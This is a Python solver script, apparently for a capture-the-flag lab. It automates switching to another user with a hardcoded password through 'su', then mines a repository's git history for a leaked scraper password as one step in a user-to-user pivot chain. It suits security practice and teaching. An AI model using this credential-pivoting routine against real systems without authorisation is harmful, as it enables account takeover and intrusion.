"""Chain: svc-deploy -su-> deephax -git-> gh0st404 -collect.sh-> sunstalker."""
import asyncio
import os
import sys
import uuid

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import find_flags as ff  # noqa: E402
from find_flags import Shell  # noqa: E402

DEEPHAX_PW = "Sk4t3rB0y_S1nce_2011"


async def wait_for(sh, needle, timeout=45.0):
    buf, loop = "", asyncio.get_event_loop()
    end = loop.time() + timeout
    while loop.time() < end:
        buf += await sh.read(1.5)
        if needle in buf:
            return True, buf
    return False, buf


async def cmd(sh, command, timeout=45.0):
    tag = "Z" + uuid.uuid4().hex[:7]
    await sh.send(command)
    await asyncio.sleep(0.3)
    await sh.send(f"echo {tag}D")
    ok, buf = await wait_for(sh, f"{tag}D", timeout)
    txt = "\n".join(l for l in buf.splitlines() if tag not in l)
    return ff_clean(txt), ok


def ff_clean(s):
    """Strip ANSI colour escapes that bash's ls --color adds."""
    import re
    s = re.sub(r"\x1b\[[0-9;?]*[a-zA-Z]", "", s)
    s = s.replace("\x1b[?2004l", "").replace("\x1b[?2004h", "")
    return s.strip()


async def su_to(sh, user, password):
    await sh.send(f"su - {user}")
    got, _ = await wait_for(sh, "Password:", 25.0)
    if not got:
        return False
    await sh.send(password)
    await asyncio.sleep(3.0)
    await sh.read(2.0)
    who, _ = await cmd(sh, "id", 25)
    return user in who


async def body(sh):
    await sh.read(5.0)
    print("start:", (await cmd(sh, "id"))[0][:120], flush=True)

    print("\n### 1. su deephax", flush=True)
    if not await su_to(sh, "deephax", DEEPHAX_PW):
        print("[!] su deephax failed", flush=True)
        return False
    print("now:", (await cmd(sh, "whoami"))[0], flush=True)

    print("\n### 2. git history for the leaked scraper password", flush=True)
    print(await cmd(sh, "cd ~/kingmaker-scraper && git show 49df4e8 --stat", 40), flush=True)
    print("\n--- full diff of the first commit ---", flush=True)
    print(await cmd(sh, "cd ~/kingmaker-scraper && git show 49df4e8", 45), flush=True)
    print("\n--- what the later commit removed ---", flush=True)
    print(await cmd(sh, "cd ~/kingmaker-scraper && git show b014c26", 45), flush=True)
    return True


async def main():
    for attempt in range(1, 5):
        try:
            async with Shell() as sh:
                if await body(sh):
                    return
        except Exception as e:
            print(f"[outer {attempt}] {type(e).__name__}", flush=True)
        await asyncio.sleep(6)
    print("[!] done", flush=True)


asyncio.run(main())
